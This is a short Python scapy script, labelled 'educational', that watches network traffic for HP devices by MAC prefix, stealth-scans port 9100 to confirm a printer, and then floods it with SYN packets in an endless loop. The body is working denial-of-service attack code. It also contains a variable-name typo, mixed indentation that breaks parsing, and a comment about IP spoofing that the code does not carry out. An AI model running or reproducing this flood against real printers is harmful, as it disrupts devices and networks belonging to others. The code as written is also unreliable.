#!/usr/bin/python3
#this script is for educational purposes only!
#made by asher_epstein_42
from scapy.all import *

raw_printing_port = 9100 #this port is used for raw printing
#function to filter frames by the first half of the destination mac address(that determine that this is an hp device -> 9C:7B:EF)
def filter_HP_device(frame):
	return frame[Ether].dst[0:8] == "9c:7b:ef" #Hewlett Packard(HP) mac address
 

while True:	
#sniffing a HP device by mac address	
	frames = sniff(count = 1, lfilter = filter_HP_device)

	printer_possible_ip = frames[0][IP].dst 

#stealth scan->hp printer ip and port 9100 

	stealth_scan_hp = sr1(IP(dst=printer_possible_ip)/TCP(dport=raw_printing_port,flags='S'),timeout=10)

	if(stealth_scan_hp.getlayer(TCP).flags == 0x12): #0x12 -> syn ack -> the port is open
	#send reset to complete the scan
		send_rst = sr(IP(dst=printer_possible_ip)/TCP(dport=aw_printing_port,flags='R'),timeout=10)
        
	#start dos attack (SYN Flooding Attack)
		hp_ip = IP(dst=printer_possible_ip)
        #set src address to a spoofed random IP address in the private network range 
     	  	hp_tcp = TCP(sport=RandShort(), dport=80, flags="S")
	#sending raw data
        	hp_raw = Raw(b"X" * 10000) 
        	dos_packet = hp_ip / hp_tcp / hp_raw
        	send(dos_packet,loop=1, verbose=0)
	
	
	
	

#The porpose of this script is to check if someone is trying to connect to a HP printer over the network,
#and in case of detection -> perform a dos(denial of service) attack on the hp printer
# first, we are sniffing using scapy to check if someone is trying to connect to a hp device.
# because you can't determine the type of the hp device by the mac address (only that this is a hp device
# - mac address of hp devices starts with 9C:7B:EF)
# we are going to preferm a stealth scan using our capturd destination IP address and port 9100 (raw ptinting) over tcp to see if we manage to get any response
# - there for this is a hp printer (because it uses raw printing protocol) .
# if it is a hp printer, were going to send a reset and start a dos attack(SYN Flooding Attack ).		




	
	 
